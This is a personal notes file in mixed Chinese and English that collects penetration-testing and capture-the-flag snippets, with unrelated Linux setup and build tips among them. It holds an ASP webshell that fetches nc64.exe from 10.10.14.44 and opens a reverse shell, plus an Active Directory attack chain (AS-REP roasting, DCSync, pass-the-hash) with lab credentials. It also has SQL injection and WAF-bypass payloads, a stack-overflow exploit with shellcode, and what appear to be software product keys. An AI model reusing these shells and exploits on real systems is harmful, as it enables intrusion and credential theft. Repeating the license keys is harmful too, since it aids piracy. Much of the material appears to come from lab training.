sqli
ghauri -u 'url' -p id --batch --confirm --dbs --level 3 --dbms mysql


recon
JS Recon : WaybackURLs & HTTPX

waybackurls url | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xargs -I{} python lazyegg[.]py "{}" --js_urls --domains --ips > urls && cat urls | grep '\.' | sort -u  | xargs -I{} httpx -silent -u {} -sc -title -td
echo url |waybackurls|urldedupe


gdb
sudo apt install glibc-source
tar xvf glibc-2.38.tar.xz
directory /usr/src/glibc/glibc-2.38
ÂèØ‰ª•ÊâßË°å‚Äúset print pretty on‚ÄùÂëΩ‰ª§ÔºåËøôÊ†∑ÊØèË°åÂè™‰ºöÊòæÁ§∫ÁªìÊûÑ‰ΩìÁöÑ‰∏ÄÂêçÊàêÂëòÔºåËÄå‰∏îËøò‰ºöÊ†πÊçÆÊàêÂëòÁöÑÂÆö‰πâÂ±ÇÊ¨°ËøõË°åÁº©Ëøõ
ptype /o pthread

wsl2
1.windows v2rayÂÆ¢Êà∑Á´ØÂºÄÂêØÂÖÅËÆ∏Êù•Ëá™Â±ÄÂüüÁΩëÁöÑËøûÊé•„ÄÇ

2.wsl‰∏≠ÂÖ≥Èó≠Ëá™Âä®Êõ¥Êñ∞dns nameserver /etc/wsl.conf Êñá‰ª∂‰∏≠ËÆæÁΩÆ‰∏∫false„ÄÇ

[network]
generateResolvConf = false
ÁÑ∂Âêé/etc/resolv.conf‰∏≠nameserverÊõøÊç¢Êàê8.8.8.8ÊàñËÄÖÂÖ∂‰ªñÂèØÁî®ÁöÑdnsÊúçÂä°Âô®„ÄÇ

ÔºàËøôÈáåÂÅöËøô‰∏™ÁöÑÂéüÂõ†ÊòØÈªòËÆ§ÁöÑnameserverÊòØÂÆø‰∏ªÊú∫windows10ÁöÑIPÔºå‰ºöÈÄöËøáwindows10Êú∫Âô®ÂéªËøûÊé•ÁúüÊ≠£ÁöÑnameserverÔºå‰ΩÜÊòØ‰ΩøÁî®‰∫Üv2rayÁ≠âËΩØ‰ª∂ÂêéÂØºËá¥ËØ•Â•óË∑Ø‰∏çÂèØÁî®Ôºåwsl2Êó†Ê≥ïÂ∞ÜvpnÂΩìÊàênameserverÔºâ

3.Âú®~/.bashrc‰∏≠Ê∑ªÂä†Â¶Ç‰∏ãÂÜÖÂÆπ [1]

# add for proxy
export hostip=$(ip route | grep default | awk '{print $3}')
export hostport=10808
alias proxy='
    export HTTPS_PROXY="socks5://${hostip}:${hostport}";
    export HTTP_PROXY="socks5://${hostip}:${hostport}";
    export ALL_PROXY="socks5://${hostip}:${hostport}";
    echo -e "Acquire::http::Proxy \"http://${hostip}:${hostport}\";" | sudo tee -a /etc/apt/apt.conf.d/proxy.conf > /dev/null;
    echo -e "Acquire::https::Proxy \"http://${hostip}:${hostport}\";" | sudo tee -a /etc/apt/apt.conf.d/proxy.conf > /dev/null;
'
alias unproxy='
    unset HTTPS_PROXY;
    unset HTTP_PROXY;
    unset ALL_PROXY;
    sudo sed -i -e '/Acquire::http::Proxy/d' /etc/apt/apt.conf.d/proxy.conf;
    sudo sed -i -e '/Acquire::https::Proxy/d' /etc/apt/apt.conf.d/proxy.conf;
'
proxy
test:
culr -vv google.com

pwn
No module named elftools.common.py3compat
pip3 uninstall pyelftools
pip3 install pyelftools==0.29
repo:
github.com/exd0tpy/CTF-browser-challenges?tab=readme-ov-file
https://github.com/m1ghtym0/browser-pwn
https://github.com/De4dCr0w/Browser-pwn

received_data = re(14)
received_data = received_data.replace(' ', '').replace('0x', '')
stack = int(received_data, 16)

ubuntu14
right click to open in terminal
sudo apt-get install nautilus-open-terminal
explorer
nautilus .

autologin
2„ÄÅ‰∏§ÁßçÈÖçÁΩÆÁöÑÊñπÂºè

1)ÂèØ‰ª•Êñ∞Âª∫lightdm.conf Êñá‰ª∂ÔºåÂ¶ÇÊûúÊ≤°Êúâ‰∏äËø∞Êñá‰ª∂Ëá™Â∑±ËøõË°åÂàõÂª∫Âç≥ÂèØÔºàmkdir lightdm ,touch /etc/lightdm.confÔºâ
$sudo gedit  /etc/lightdm/lightdm.conf 

Âú®ÂÖ∂‰∏≠Â°´ÂÜôÂÖ•Â¶Ç‰∏ãÁöÑÂÜÖÂÆπÔºåÁÑ∂ÂêéÈáçÂêØÔºåÈÄâÊã©‚ÄúÁôªÈôÜ‚ÄùËæìÂÖ•rootÁî®Êà∑ÂØÜÁ†Å:

[SeatDefaults]
user-session=ubuntu
greeter-show-manual-login=true

2)‰πüÂèØ‰ª•ÁºñËæë50-ubuntu.confÊñá‰ª∂
$sudo gedit /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf   
Âú®ÂÖ∂‰∏≠Ê∑ªÂä†Â¶Ç‰∏ãÁöÑÂÜÖÂÆπÔºåÈáçÊñ∞ÂêØÂä®ÔºåÈÄâÊã©‚ÄúÁôªÈôÜ‚ÄùËæìÂÖ•rootÁî®Êà∑ÂØÜÁ†ÅÔºö
greeter-show-manual-login=true

ÈÖçÁΩÆrootËá™Âä®ÁôªÈôÜ
ÂèØ‰ª•ÁºñËæëlightdm.conf
$sudo gedit  /etc/lightdm/lightdm.conf 

ÂÜçÂÖ∂‰∏≠Ê∑ªÂä†Â¶Ç‰∏ãÁöÑÂÜÖÂÆπÔºåÂêåÊ†∑ÈáçÊñ∞ÂêØÂä®ÔºåÁôªÈôÜ‰∏≠Áî®rootÁôªÈôÜÔºö
[SeatDefaults]
autologin-user=root
greeter-session=unity-greeter
user-session=ubuntu
greeter-show-manual-login=true
allow-guest=false
‰øÆÊîπ/root/.profileÊñá‰ª∂
/root/.profile
ÊñáÊ°£ÊúÄÂêé‰∏ÄË°å mesg n || true ÂâçÊ∑ªÂä† tty -s && Âç≥ tty -s &&mesg n || true

python3.8
apt install -y build-essential checkinstall libreadline-gplv2-dev libncursesw5-dev libncurses-dev \
libsqlite3-dev libgdbm-dev libc6-dev libbz2-dev libffi-dev tk-dev liblzma-dev lzma-dev uuid-dev

wget http://www.openssl.org/source/openssl-1.1.1l.tar.gz
mkdir /usr/local/ssl
./config --prefix=/usr/local/ssl --openssldir=/usr/local/ssl no-zlib
make && make install
echo "/usr/local/ssl/lib" >> /etc/ld.so.conf
cd Python3.8
./configure --prefix=/usr/local/python3
ÂÖà‰øÆÊîπModules/Setup
make && make install
ln -sf /usr/local/python3/bin/python3.8 /usr/bin/python   #ÁªàÁ´ØÂÜçÊ¨°‰ΩøÁî®pythonÈªòËÆ§ÁöÑÂ∞±ÊòØ3.8.3ÔºåÂΩìÁÑ∂‰Ω†‰πüÂèØ‰ª•ËÆæÁΩÆpython3
ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3


llvm
./clang: error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory
ln -s /lib/x86_64-linux-gnu/libtinfo.so.6 /lib/x86_64-linux-gnu/libtinfo.so.5
'''
1Ôºâ‰∏ãËΩΩllvmÁöÑÊ∫ê‰ª£Á†Å

http://llvm.org/releases/3.5.0/llvm-3.5.0.src.tar.xz
mv llvm-3.5.0.src llvm
2Ôºâ‰∏ãËΩΩclangÁöÑÊ∫ê‰ª£Á†Å

cd llvm/tools
wget http://llvm.org/releases/3.5.0/cfe-3.5.0.src.tar.xz
tar xf cfe-3.5.0.src.tar.xz
mv cfe-3.5.0.src clang
3Ôºâ‰∏ãËΩΩcompiler-rtÁöÑÊ∫ê‰ª£Á†Å

cd ../projects
wget http://llvm.org/releases/3.5.0/compiler-rt-3.5.0.src.tar.xz
tar xf compiler-rt-3.5.0.src.tar.xz
mv compiler-rt-3.5.0.src compiler-rt
4ÔºâÈÖçÁΩÆÁºñËØëÈÄâÈ°π

cd ..
./configure --enable-optimized CC=gcc CXX=g++
5ÔºâÁºñËØëllvm

make -j2
ÁºñËØëÊàêÂäüÂêéÁöÑÊèêÁ§∫Ôºö

llvm[0]: ***** Completed Release+Asserts Build
6ÔºâÂÆâË£ÖÁºñËØëÂ•ΩÁöÑllvm

make install
'''

1.Âú®docopt ¬∑ PyPI ‰∏ãËΩΩÊñá‰ª∂
2.Ëß£ÂéãÂπ∂cdÂà∞ÁõÆÂΩï‰∏ã

3.ÊâìÂºÄsetup.pyÊääfrom docopt import __version__Ê≥®ÈáäÂπ∂Êñ∞Â¢û‰∏ÄË°åÔºö(Âê¶Âàô‰æùÁÑ∂Êä•ÈîôNo module named 'docopt')

#from docopt import __version__
__version__ = '0.6.2'
4.python setup.py build

5.python setup.py install
ÂáØÊííÂØÜÁ†ÅÔºöËøôÊòØ‰∏ÄÁßçÁÆÄÂçïÁöÑÂä†ÂØÜÊäÄÊúØÔºåÂÖ∂‰∏≠ÊòéÊñá‰∏≠ÁöÑÊØè‰∏™Â≠óÊØçÈÉΩË¢´ÊõøÊç¢‰∏∫Â≠óÊØçË°®‰∏≠Âõ∫ÂÆöÊï∞Èáè‰ΩçÁΩÆ‰∏ãÁöÑÂ≠óÊØç„ÄÇ‰æãÂ¶ÇÔºåÂÅèÁßª1ÔºåAÂ∞ÜË¢´ÊõøÊç¢‰∏∫BÔºåBÂ∞ÜÂèò‰∏∫CÔºå‰æùÊ≠§Á±ªÊé®„ÄÇ
ÂçïÂ≠óÊØçÊõøÊç¢ÂØÜÁ†ÅÔºöËøôÊòØ‰∏ÄÁßçÊõøÊç¢ÂØÜÁ†ÅÔºåÂÖ∂‰∏≠ÊòéÊñáÁöÑÊØè‰∏™Â≠óÊØçÈÉΩË¢´Âè¶‰∏Ä‰∏™Â≠óÊØçÊõøÊç¢„ÄÇ‰æãÂ¶ÇÔºåÂ¶ÇÊûú‚ÄúA‚ÄùË¢´ÊõøÊç¢‰∏∫‚ÄúD‚ÄùÔºå‚ÄúB‚ÄùË¢´ÊõøÊç¢‰∏∫‚ÄúE‚ÄùÔºåÁ≠âÁ≠âÔºåÈÇ£‰πàÂçïËØç‚ÄúAB‚ÄùÂ∞ÜË¢´Âä†ÂØÜ‰∏∫‚ÄúDE‚Äù„ÄÇ
PlayfairÂØÜÁ†ÅÔºöÁî±Êü•Â∞îÊñØ¬∑ÊÉ†ÁâπÊñØÈÄöÂú®1854Âπ¥ÂèëÊòéÔºåËøôÊòØÁ¨¨‰∏ÄÁßçÂÆûÁî®ÁöÑÂèåÂ≠óÊØçÊõøÊç¢ÂØÜÁ†Å„ÄÇÂÆÉÂä†ÂØÜÂ≠óÊØçÂØπÔºàÂèåÂ≠óÊØçÔºâËÄå‰∏çÊòØÂçï‰∏™Â≠óÊØç„ÄÇËøô‰ΩøÂæóÈ¢ëÁéáÂàÜÊûêÊõ¥Âä†Âõ∞ÈöæÔºåÂõ†‰∏∫ÊúâÂ§ßÁ∫¶600ÁßçÁªÑÂêàÔºåËÄå‰∏çÊòØ26Áßç„ÄÇ
Â§öÂ≠óÊØçÊõøÊç¢ÂØÜÁ†ÅÔºöËøôÊòØ‰∏ÄÁßç‰ΩøÁî®Â§ö‰∏™ÊõøÊç¢Â≠óÊØçË°®ÁöÑÊõøÊç¢ÂØÜÁ†Å„ÄÇÊúÄÁü•ÂêçÁöÑÂ§öÂ≠óÊØçÊõøÊç¢ÂØÜÁ†ÅÁ§∫‰æãÊòØVigen√®reÂØÜÁ†Å„ÄÇÂéüÂßãÊñáÊú¨ÁöÑÂä†ÂØÜÊòØ‰ΩøÁî®Vigen√®reÊñπÈòµÊàñVigen√®reË°®ÂÆåÊàêÁöÑ„ÄÇ
72J*SaP5+QTmrnMe
--techniqueÔºà--tech=BEUSTÔºâ
Ëøô‰∏™ÂèÇÊï∞ÂèØ‰ª•ÊåáÂÆösqlmap‰ΩøÁî®ÁöÑÊ≥®ÂÖ•Á±ªÂûãÔºåÈªòËÆ§ÊÉÖÂÜµ‰∏ã‰ºöÊµãËØïÊâÄÊúâÁöÑÊñπÂºè„ÄÇÊîØÊåÅÁöÑÊ≥®ÂÖ•Á±ªÂûãÂ¶Ç‰∏ãÔºö
B: Boolean-based blind SQL injection
E: Error-based SQL injection
U: UNION query SQL injection
S: Stacked queries SQL injection
T: Time-based blind SQL injection
--output-dir=C:\gitzone\demo

GBK Encoding / MultiByte Attack

Âòä = %E5%98%8A = \u560a ‚áí %0A
Âòç = %E5%98%8D = \u560d ‚áí %0D
Âòæ = %E5%98%BE = \u563e ‚áí %3E (>)
Âòº = %E5%98%BC = \u563c ‚áí %3C (<)
Âò¢ = %E5%98%A2 = \u5622 ‚áí %22 (')
Âòß = %E5%98%A7 = \u5627 ‚áí %27 (")

For XSS, CRLF, WAF bypass

Ê≠£Âàô
ÂéªÈô§Á©∫ÁôΩË°å^[ \t]*\n
ÂéªÈô§ÂåÖÂê´Ë°å^.*google.com.*$
üõ†Ô∏è Burp
üõ†Ô∏è Nmap
üõ†Ô∏è @securitytrails
üõ†Ô∏è @Shodanhq
üõ†Ô∏è @spiderfoot
üõ† @ipinfoio
üõ†Ô∏è My own tools (http://github.com/hakluke)
üõ†Ô∏è Everything by 
@pdiscoveryio
üõ†Ô∏è Everything by 
@tomnomnom


unsafe cors
ÂìçÂ∫îÂåÖ‰∏≠access-control-allow-origin:*
exploit:
origin:http://evil.com
access-control-allow-origin:http://evil.com

bypass AppLocker rules. We can use the tool Accesschk
cd C:\inetpub\wwwroot\Data\sites\1\media\logos
rename-item -path "accesschk64.txt" -newname "accesschk64.exe"
.\accesschk64.exe -w -s -q -u Users "C:\Windows" >> windows.txt -accepteula
type windows.txt


bash tcp port scan
ports=(22 53 80 3306);for host in {100..110}; do for port in ${ports[@]}; do (echo
>/dev/tcp/172.69.0.$host/$port) > /dev/null 2>&1 && echo "port $port is open on
172.69.0.$host"; done; done

As nmap is not installed we can use Bash instead.
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT
&>/dev/null" 2>/dev/null && echo "port $PORT is open"; done

scan the SNMP service and obtain all variables of the managed systems and displays them.
snmpwalk -v 1 -c public 10.10.11.136

scan
masscan -p1-65535 10.10.10.93 --rate=1000 -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
tcp:
nmap -Pn -sV -sC -p$ports 10.10.10.93
udp:
nmap -Pn -sU -sV -sC -p$ports 10.10.10.92
dnsenum --dnsserver 10.10.10.224 -f /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt realcorp.htb

gobuster(php ext:
gobuster -w directory-list-2.3-medium.txt -u http://10.10.10.101/ -t 100 -x php

gobuster -w directory-list-2.3-medium.txt -u http://10.10.10.137:3000/ -t 150 -s "200,204,301,302,307,403,401"
subdomain:
gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | grep -v 302
wfuzz -w /usr/share/dirb/wordlists/common.txt -H "Host: FUZZ.stacked.htb" --sc 200 http://stacked.htb

ffuf
ffuf -u http://10.10.10.171/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401 -o results.txt
python crawl.py results.txt
subdomain:
ffuf -u http://10.129.142.60 -H 'Host: FUZZ.bolt.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

enumerate SNMP service using snmpwalk tool.
snmpwalk -v 2c -c public 10.10.10.251

foothold
ASREPRoasting attack in order to extract a hash from user accounts that do not require pre-authentication.
https://github.com/urbanadventurer/username-anarchy
./username-anarchy --input-file fullnames.txt --select-format
first,flast,first.last,firstl > unames.txt
while read p; do GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -
dc-ip 10.10.10.175 >> hash.txt; done < unames.txt
hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force

With the gained credentials fsmith / Thestrokes23 we can try to login using WinRM (port
5985). Windows Remote Management (WinRM), is a Windows-native built-in remote management
protocol and it is often enabled for users that need to manage systems remotely. We can use evil-winrm(https://github.com/Hackplayers/evil-winrm) to connect to the remote system.
evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
Privilege Escalation
can use a script such as WinPEAS(https://github.com/carlospolop/PEASS-ng/tree/master) to automate enumeration tasks. Use the upload command from our current WinRM session to transfer the binary to the remote server, and then run it.The script reveals that the user EGOTISTICALBANK\svc_loanmanager has been set to automatically
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

We can use Bloodhound to enumerate and visualise the Active Directory domain, and identify possible attack chains that will allow us to elevate our domain privileges.The bloodhoundpython ingestor can be used to remotely collect data from the Active Directory. Then, we can run bloodhound to visualise any available attack paths.
sudo apt install bloodhound
sudo pip install bloodhound-python
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICALBANK.LOCAL -ns 10.10.10.175 -c All

Impacket's secretsdump.py(https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) can be used to perform DCSync attack
secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator
Having successfully extracted the hash of the administrator, we can perform a Pass The Hass attack using Impacket's psexec.py(https://github.com/fortra/impacket/blob/master/examples/psexec.py) and the returned hash, and get a shell as SYSTEM
psexec.py egotistical-bank.local/administrator@10.10.10.175 -hashes d9485863c1e9e05851aa40cbb4ab9dff:d9485863c1e9e05851aa40cbb4ab9dff


convert to sql_En
printf 0x; printf "/etc/passwd" | xxd -ps -c 200 | tr -d '\n'; echo

sysctl -w net.ipv4.icmp_echo_ignore_all=1
ANSI to UTF-8
fcrackzip -D -p ../../wordlists/rockyou.txt -u backup.zip
Privilege Escalation
LinEnum: https://github.com/rebootuser/LinEnum

grep -c file < file1 eq cat file1 | grep -c file

curl http://sneakycorp.htb/team.php | grep '@' | awk '{gsub(/<[^>]*>/,"");print;}' | tr -d ' ' > emails.txt

asp rce(webshell&execute
<%Function execStdOut(cmd)
 Dim wsh: Set wsh = CreateObject( "WScript.Shell" )
 Dim aRet: Set aRet = wsh.exec(cmd)
 execStdOut = aRet.StdOut.ReadAll()
 End Function
 theOutput = execStdOut("curl 10.10.14.44/nc64.exe -o \programdata\nc64.exe")
 response.write "Output: " & theOutput
%>

<%Function execStdOut(cmd)
 Dim wsh: Set wsh = CreateObject( "WScript.Shell" )
 Dim aRet: Set aRet = wsh.exec(cmd)
 execStdOut = aRet.StdOut.ReadAll()
 End Function
 theOutput = execStdOut("\programdata\nc64.exe 10.10.14.44 7777 -e cmd")
 response.write "Output: " & theOutput
%>

Integer-Overflow-to-Buffer-Overflow (IO2BO)



ReLU function

Libdft [32], Triton [2], and DFSan [5]

fsm

 Finite State Machine

ASLR Address Space Layout Randomization 

NX Never Execute 

XD Execute Disable

IA32/64 Intel architecture 32 bit /64 bit

VM Virtual Memory

VMS Virtual Memory Space

PIC Position Independent Code

PAE Physical Address Extension 

OS Operating System

RAM Random Access Memory

GB Gigabyte 

ELF Executable Linking Format

AST Abstract Syntax Tree

PDG Program Dependency Graph

PSW Program Status Word

CFG Control Flow Graph

POC Proof of Concepts



pointer dereference, array write, and dangerous

function



 CPG

code property graph



interprocedural sanitization graph

(IPSG) and declaration-spread-sink graph (DSSG) to CPG to

form the extended code property graph (ECPG)



Nearest Neighbors (KNN),

Decision Tree (DT), Naive Bayes (NB), AdaBoost, and

Support Vector Machines (SVM)



flawfinder

lexical analysis

https://www.cgsecurity.org/exploit/heaptut.txt

In order to prevent ClamAV from

crashing on the next free(), one can overwrite the .got address of

free() and wait.



The addresses of the constructors and destructors each stored in a different section in our ELF executable. for the constructors there

is a section called '.CTORS' and for the destructors there is the '.DTORS' section. 



heap-based buffer-overflow

? Must overwrite memory management information

Â∞Ü size_t Âº∫ËΩ¨‰∏∫ int Á±ªÂûã‰ΩøÁî®ÔºåÂØºËá¥Ê£ÄÊü•ÁªïËøáÔºåÊúÄÁªàÂÆûÁé∞ÂêëÂâçË∂äÁïåÂÜô



Á°ÆÂÆöÂπ∂ÂàÜÊûêFuzzÁõÆÊ†á„ÄÇ

ÂàùÊ≠•ËøêË°åFuzzÂ∑•ÂÖ∑‰øùËØÅËÉΩÂ§üÊ≠£Â∏∏ÂºÄÂßãFuzz„ÄÇ

Êî∂ÈõÜÂ§ßÈáèÂàùÂßãÁî®‰æãÂπ∂ÂØπÂàùÂßãÁî®‰æãÂéªÈáç„ÄÇ

Áî®ÂéªÈáçÂêéÁöÑÂàùÂßãÁî®‰æãÂºÄÂßãFuzz„ÄÇ

Âú®FuzzËøáÁ®ã‰∏≠ÂΩì‰ª£Á†ÅË¶ÜÁõñÁéáÈïøÊó∂Èó¥Ê≤°ÊúâÂ¢ûÈïøÊó∂Ôºå‰∫∫Â∑•‰ªãÂÖ•ÂàÜÊûê‰ª£Á†ÅË¶ÜÁõñÁéáÔºåÊÉ≥ÂäûÊ≥ïÊèêÂçá‰ª£Á†ÅË¶ÜÁõñÁéá„ÄÇ

ÂØπÂèëÁé∞ÁöÑCrashÂéªÈáç„ÄÇ



Windows exp

little-endian

‚Ä¢ The mod field combines with the r/m field to form 32 possible values: eight registers and 24 addressing modes. ‚Ä¢ The reg/opcode field specifies either a register number or three more bits of opcode information. The purpose of the reg/opcode field is specified in the primary opcode. 

‚Ä¢ The r/m field can specify a register as an operand or it can be combined with the mod field to encode an addressing mode. Sometimes, certain combinations of the mod field and the r/m field is used to express opcode information for some instructions.

‚Ä¢ The scale field specifies the scale factor. 

‚Ä¢ The index field specifies the register number of the index register. (squeue ac‚Ä¶01

‚Ä¢ The base field specifies the register number of the base register



The default segment register is SS for the effective addresses containing a BP index, DS for other effective addresses

È°∫Â∫è

* EAX, Accumulator Register

* ECX, Counter Register

* EDX, Data Register

* EBX, Base Register

* ESP, Stack Pointer

* EBP, Base Pointer

* ESI, Source Index

* EDI, Destination Index

* EIP, Instruction Pointer

bypass depÈúÄË¶Å



ÊÆµÈÄâÊã©ËßÑÂàô

 

CsÊÆµÔºàÈÄªËæëÂú∞ÂùÄÔºå‰πüÊòØeipÂØÑÂ≠òÂô®ÊåáÂêëÁöÑÂÜÖÂÆπÔºâÂ≠òÂÇ®ÊâßË°åÊåá‰ª§Ôºàcpu‰ªéÊ≠§ÊÆµËé∑ÂèñÊåá‰ª§

code segment, where the instructions being executed are stored. The processor fetches instructions from the code segment, using a logical address that consists of the segment selector in the CS register and the contents of the EIP register.



SsÊÆµÂ≠òÂÇ®ÂèÇÊï∞

The SS register contains the segment selector for the stack segment, where the procedure stack is stored for the program, task, or handler currently being executed.



ollydbg

Just in time mode 

 

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbbbb

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

‰∏üÂÖ• 48 ÂÄãÂ≠óÊØç A

ËÆäÊï∏ buffer ÊîæÂú® EBP+28 ÁöÑ‰ΩçÂùÄÔºå‰πüÂ∞±ÊòØÁÇ∫ buffer È†êÁïô‰∫Ü 28 (16 ÈÄ≤‰Ωç) ÁöÑÁ©∫ÈñìÔºå‰πüÂ∞±ÊòØ 40 ÂÄã‰ΩçÂÖÉÁµÑÔºåÈÄôÁ©∫Èñì‰∏çÂåÖÂê´ EBP Êú¨Ë∫´ÔºåÈúÄË¶Åebp+4Ë¶ÜÁõñÂà∞eip

PC ‰∏ä Windows ÊòØ little-endian

buffer_overflow ÁöÑÊúÄÂæå‰∏ÄÂÄã‰ΩçÂÖÉÁµÑÊòØ NULL Â≠óÂÖÉ \x00ÔºåÈÄô‰ª£Ë°®ÊàëÂÄë‰∏çÂèØËÉΩÂ¢ûÂä†ÂÖ∂‰ªñÁöÑÂ≠óÂÖÉÂú®ÂÖ∂ÂæåÈù¢„ÄÇ

Êà™Êñ≠

Repeat the process to identify the bad characters. 2. Why are these characters not allowed? How do these bad hex characters translate to ASCII?

 54 c3  ->PUSH ESP # RETN Êåá‰ª§





77be0000 77c38000   C:\WINDOWS\system32\msvcrt.dll

 s 77be0000 77c38000 54 c3

77c21025

\x25\x10\xc2\x77

#include <string>

#include <sstream>

#include <cstdlib>

using namespace std;



int main(int argc, char **argv) {

    string simplec001(argv[1]);

    string junk(40,'A');

    string ebp(4, 'B');

    string eip("\x25\x10\xc2\x77");// msvcrt.dll 77c21025, push esp # retn

    string instructions("\xcc\xcc\xcc\xcc");

    ostringstream sout;

    sout << '\"' << simplec001 << "\" " << junk

         << ebp << eip << instructions;

    system(sout.str().c_str());

    system("pause");

}



environment impact(Chinese or English version

set pivot

MOV EAX,0x77777777

MOV ECX,0x77376589

XOR EAX,ECX

JMP EAX



Ds segment

shellcode

00403000  48 65 6C 6C 6F 2C 20 57  Hello, W

00403008  6F 72 6C 64 21 0A 00 00  orld!...



little-endian

PUSH 0x00000A21

PUSH 0x646C726F

PUSH 0x57202C6F

PUSH 0x6C6C6548

PUSH ESP

#include <cstdio>

using namespace std;



char shellcode [] =

"\x68\x21\x0A\x00\x00" // push dword 0xa21

"\x68\x6F\x72\x6C\x64" // push dword 0x646c726f

"\x68\x6F\x2C\x20\x57" // push dword 0x57202c6f

"\x68\x48\x65\x6C\x6C" // push dword 0x6c6c6548

"\x54"                 // push esp

"\xB9\x6A\x18\xC4\x77" // mov ecx,0x77c4186a (modify this value)

DS:[00405100]=77C1186A (msvcrt.printf)

Local call from 004012C1

"\xFF\xD1"             // call ecx

"\x31\xC0"             // xor eax,eax

"\x50"                 // push eax

"\xB9\x7E\x9E\xC3\x77" // mov ecx,0x77c39e7e (modify this value)

DS:[004050EC]=77C09E7E (msvcrt.exit)

Local call from 004012CD

"\xFF\xD1"             // call ecx

;



‰øÆÊîπÂêéshellcode

"\x68\x21\x0a\x00\x00" "\x68\x6f\x72\x6c\x64" "\x68\x6f\x2c\x20\x57" "\x68\x48\x65\x6c\x6c" "\x54" "\xc7\xc1\x6a\x18\xc1\x77" "\xff\xd1" "\x33\xc0" "\x50" "\xc7\xc1\x7e\x9e\xc0\x77" "\xff\xd1"



typedef void (*FUNCPTR)();

int main() {

    printf("<< Shellcode ÈñãÂßãÂü∑Ë°å >>\n");



    FUNCPTR fp = (FUNCPTR)shellcode;

    fp();



    printf("(‰Ω†Áúã‰∏çÂà∞ÈÄô‰∏ÄË°åÔºåÂõ†ÁÇ∫ shellcode Âü∑Ë°å exit() Èõ¢ÈñãÁ®ãÂºè‰∫Ü)");

}

Project Â±ûÊÄßÂãæÈÄâ

Ëß£ÂÜ≥ÈóÆÈ¢òÂ¶Ç‰∏ãÔºö

‚Ä¢È†êÂÖàÂÅáË®≠Á®ãÂºèÁöÑÂü∑Ë°åÁí∞Â¢ÉÊòØ Windows ÁöÑ cmd.exe ÂëΩ‰ª§ÂàóÊ®°Âºè (Console Ê®°Âºè)

‚Ä¢Âê´Êúâ NULL Â≠óÂÖÉ (\x00 Â≠óÂÖÉ)

‚Ä¢‰ΩøÁî®‰∫ÜÁµïÂ∞çË®òÊÜ∂È´î‰ΩçÂùÄ 77C4186A (msvcrt.printf) Âíå 77C39E7E (msvcrt.exit)

‚Ä¢È†êÂÖàÂÅáË®≠‰∫ÜÂáΩÂºè printf Âíå exit ‰∏ÄÂÆöÂèØ‰ª•Ë¢´ÂëºÂè´Âà∞Ôºå‰πüÂ∞±ÊòØÈ†êÂÖàÂÅáË®≠ msvcrt.dll ‰∏ÄÂÆöË¢´ËºâÂÖ•Âà∞Ë®òÊÜ∂È´î‰∏≠

 msvcrt.dll Ë¢´ËºâÂÖ•Âà∞Ë®òÊÜ∂È´î‰ΩçÂùÄ‰∏çÂêåËÄåÊîπËÆä



/*

run.c - a small skeleton program to run shellcode

*/

// bytecode here

char code[] = "my shellcode here";



int main(int argc, char **argv) {

  int (*func)();             // function pointer

  func = (int (*)()) code;   // func points to our shellcode

  (int)(*func)();            // execute a function code[]

  // if our program returned 0 instead of 1, 

  // so our shellcode worked

  return 1;

}

Vm 16 Â∫èÂàóÂè∑

ZF3R0-FHED2-M80TY-8QYGC-NPKYF

Winxp sp2 Â∫èÂàóÂè∑

HCQ9D-TVCWX-X9QRG-J4B2Y-GR2TT

control-flow bending techniques

ÂèñÂæó kernel32.dll ÁöÑÂü∫Â∫ïÔºåÂÜçÂèñÂæó LoadLibraryA ÁöÑ‰ΩçÂùÄÔºåÁÑ∂ÂæåÊàëÂÄë‰ΩøÁî® LoadLibraryA Â∞á msvcrt.dll ËºâÂÖ•ÔºåÂÜçÂèñÂæó printf Âíå exit ÁöÑ‰ΩçÂùÄ



0:000> !load wow64exts

0:000> !wow64exts.sw

ÂàáÊç¢‰∏∫32‰Ωç

Ê≤°ÊúâÊàêÂäüÂä†ËΩΩÁ¨¶Âè∑ÔºåÊâãÂä®Âä†ËΩΩÊ≥®ÊÑèË∑ØÂæÑ

C:\symbol\ntdll.pdb\1751003260CA42598C0FB326585000ED2\ntdll.pdb

0:000> !sym noisy

noisy mode - symbol prompts on

0:000> .reload 

Reloading current modules

00341ea0 + 1c = 00341ebcÔºåÈÄôÂ∞±ÊòØ InInitializationOrderModuleList ÁöÑ‰ΩçÂùÄÔºåÂÖ∂ÁµêÊßãÊòØ _LIST_ENTRY (ÊàëÂÄëÂâõÂâõË™™ÁöÑÈõôÂêëÈèàÁµê‰∏≤Âàó)

https://github.com/wine-mirror/wine/blob/master/include/winternl.h

Winternl.h

typedef struct _LDR_DATA_TABLE_ENTRY

{

    LIST_ENTRY          InLoadOrderLinks;

    LIST_ENTRY          InMemoryOrderLinks;

    LIST_ENTRY          InInitializationOrderLinks;

    void*               DllBase;

    void*               EntryPoint;

    ULONG               SizeOfImage;

    UNICODE_STRING      FullDllName;

UNICODE_STRING      BaseDllName;

typedef struct _UNICODE_STRING {

  USHORT Length;        /* bytes */

  USHORT MaximumLength; /* bytes */

